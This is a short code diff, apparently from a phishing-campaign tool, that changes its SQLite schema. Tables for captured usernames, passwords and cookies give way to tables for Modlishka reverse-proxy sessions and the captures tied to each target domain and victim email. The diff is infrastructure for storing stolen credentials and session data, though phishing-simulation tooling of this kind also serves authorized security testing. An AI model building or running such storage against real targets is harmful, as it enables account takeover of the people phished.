@@ -237,41 +237,32 @@ db.serialize(() => {
     )
   `);
 
-  // Create captured credentials table if not exists
+  // Create Modlishka database tables
   db.run(`
-    CREATE TABLE IF NOT EXISTS captured_credentials (
+    CREATE TABLE IF NOT EXISTS modlishka_sessions (
       id INTEGER PRIMARY KEY AUTOINCREMENT,
       campaign_id INTEGER NOT NULL,
-      url TEXT,
-      username TEXT,
-      password TEXT,
-      other_fields TEXT,
-      ip_address TEXT,
-      user_agent TEXT,
-      capture_method TEXT DEFAULT 'form_submission',
+      session_token TEXT UNIQUE NOT NULL,
+      target_domain TEXT NOT NULL,
+      config_data TEXT NOT NULL,
+      status TEXT DEFAULT 'active',
       created_at DATETIME DEFAULT CURRENT_TIMESTAMP,
+      stopped_at DATETIME,
       FOREIGN KEY (campaign_id) REFERENCES Campaigns(id) ON DELETE CASCADE
     )
   `);
-
-  // Create login attempts table if not exists
+  
   db.run(`
-    CREATE TABLE IF NOT EXISTS login_attempts (
+    CREATE TABLE IF NOT EXISTS modlishka_captures (
       id INTEGER PRIMARY KEY AUTOINCREMENT,
-      campaign_id INTEGER NOT NULL,
-      session_id TEXT NOT NULL,
-      target_email TEXT NOT NULL,
-      username TEXT,
-      password TEXT,
-      input_email TEXT,
-      form_data TEXT,
-      url TEXT,
+      session_token TEXT NOT NULL,
+      type TEXT NOT NULL,
+      data TEXT NOT NULL,
+      target_email TEXT,
       ip_address TEXT,
       user_agent TEXT,
-      cookies TEXT,
       timestamp DATETIME DEFAULT CURRENT_TIMESTAMP,
-      has_cookies INTEGER DEFAULT 0,
-      FOREIGN KEY (campaign_id) REFERENCES Campaigns(id) ON DELETE CASCADE
+      FOREIGN KEY (session_token) REFERENCES modlishka_sessions (session_token) ON DELETE CASCADE
     )
   `);
 
